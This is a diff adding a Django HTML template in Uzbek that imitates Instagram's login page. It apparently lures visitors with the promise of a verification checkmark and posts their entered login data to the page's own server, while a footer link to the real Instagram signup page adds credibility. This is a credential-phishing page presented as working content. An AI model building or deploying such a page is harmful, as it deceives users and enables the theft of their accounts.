@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+  <meta charset="UTF-8">
+  <title>Instagramga Kirish</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      background-color: #fafafa;
+      font-family: 'Roboto', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-container {
+      width: 350px;
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 40px;
+      text-align: center;
+    }
+    .logo {
+      font-size: 36px;
+      font-weight: bold;
+      color: #262626;
+      margin-bottom: 20px;
+    }
+    button {
+      width: 100%;
+      background-color: #0095f6;
+      color: white;
+      padding: 10px;
+      margin-top: 20px;
+      border: none;
+      font-weight: bold;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    .info {
+      font-size: 12px;
+      color: #8e8e8e;
+      margin-top: 15px;
+    }
+    .footer {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+    .footer a {
+      color: #385185;
+      text-decoration: none;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <div class="logo">Instagram</div>
+    <div class="info">✅ Galichka olish uchun tizimga kiring</div>
+    <p></p>
+    <!-- Bosh forma faqat yo'naltirish uchun -->
+    <form method="post">
+      {% csrf_token %}
+      {{ form.as_p }}
+      <button type="submit">Send</button>
+    </form>
+
+
+    <div class="footer">
+      Hisobingiz yo‘qmi? <a href="https://www.instagram.com/accounts/emailsignup/">Ro‘yxatdan o‘tish</a>
+    </div>
+  </div>
+
+</body>
+</html>
